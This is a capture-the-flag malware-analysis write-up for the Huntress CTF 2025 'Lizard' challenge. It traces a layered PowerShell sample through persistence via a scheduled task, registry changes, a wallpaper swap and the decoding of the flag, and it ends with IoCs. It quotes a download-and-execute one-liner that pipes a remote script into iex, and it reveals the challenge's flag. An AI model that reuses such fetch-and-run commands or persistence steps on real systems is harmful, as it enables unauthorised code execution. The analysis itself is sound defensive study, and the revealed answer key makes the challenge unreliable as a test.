---
title: Lizard.
category: Malware
points: 10
---

# Lizard.
**CTF:** Huntress CTF 2025
**Category:** Malware  
**Author:** Adam Rice
**Points:** 10  
**Challenge Description:**

```md
Erm, what the sigma?

We saw this strange PowerShell string on one of our hosts, can you investigate and figure out what this does?

irm biglizardlover.com/gecko | iex
```

## Tips

**DONT RUN ANY IEX**

## Stage 1 & 2

The first stage runs iex with xor encoded bits. This is easy to remove, just copy the line WITHOUT the iex at the beginning. Powershell will output the next layer. Stage 2 is where we find some of this malware's fun actions. It changes `HKCU:\Control Panel\International` keys `s1159` and `s2359`, the AM and PM text respectively, to become Lizard. 

The malware then makes a scheduled task reinstalling itself at logon. The decription of this scheduled task is `flagvalue = objecttest + consumerfashion + uniquerebel`. Originally I had no idea what it may mean, but realized that no matter what it was it related to the end flag. Infact the very last line of stage2 is `${COns`UMeRf`A`S`HIOn} = "WXpBME16UmtOVGt3TWpnPQ=="`, the first part of our flag.

## Stage 3-5

The malware then executes the code located at `biglizardlover.com/gila`, refered to as stage3. This contains a reversed payload. Moving into the next payload we have another XoR encoded string which can be decrypted by copy pasting all except the ieX. Stage 5 being the exact same thing, but starting with stage 6 we see something different.

# Stage 6

Stage 6 is not obfuscated at all! It exposes a infinite loop and the objectTest variable, `$objectTest = "Wm14aFozczNOak0wTWpZNVlXVmhPRGs9"`. Inside the infinite loop there is logic to grab a random lizard JPEG that is placed into the `$env:TEMP` directory as lizard.jpg. The image is then set as the users wallpaper.

Inside the varaible `glideelbow`, is a base64 encoded, compressed string. This can once again be decoded the same way, copy paste without either of the ieX strings.

## Stage 7-9

At stage 7, we go back to the reversed strings which get executed and can be ran without iex just like we did in stage 3. Stage 8 and 9 also don't give us any thing interesting or new, we can just keep working through as we have been.

## Stage 10

The final stage! In this stage we see a SpeechSynthesizer being created along with a windows MessageBox which will both tell and show the date. Along with this we get the UniqueRebel variable, `$UniqueRebel = "TWpVeU9UWXlORGN3ZlE9PQ=="`, concluding our malware decoding journey.

## Compiling the final flag

Now we have all we need to get the flag. Putting together our previous hints we can make something like this:

```ps
${COns`UMeRf`A`S`HIOn} = "WXpBME16UmtOVGt3TWpnPQ=="
$objectTest = "Wm14aFozczNOak0wTWpZNVlXVmhPRGs9"
$UniqueRebel = "TWpVeU9UWXlORGN3ZlE9PQ=="

flagvalue = objecttest + consumerfashion + uniquerebel
```

Looking at each of the sections, I realized that they were encoded. ConsumerFashion, objectTest, and UniqueRebel are double base64 encoded, decoding to `c0434d59028`, `flag{7634269aea89`, and `252962470}` respectively. From this output we can make the flag `flag{7634269aea89c0434d59028252962470}`

## IoCs

### Domains /URLs
- `biglizardlover.com`
- `biglizardlover.com/gila`
- `https://biglizardlover.com/img/lizard{N}.jpg` Where N is a number between 1 and 25

### File Paths
- `%TEMP%\lizard.jpg`

### Registry / System settings

- AM: `HKCU:\Control Panel\International\s1159` (Changed to Lizard.)
- PM: `HKCU:\Control Panel\International\s2359` (Changed to Lizard.)
- HKCU\Control Panel\Desktop\Wallpaper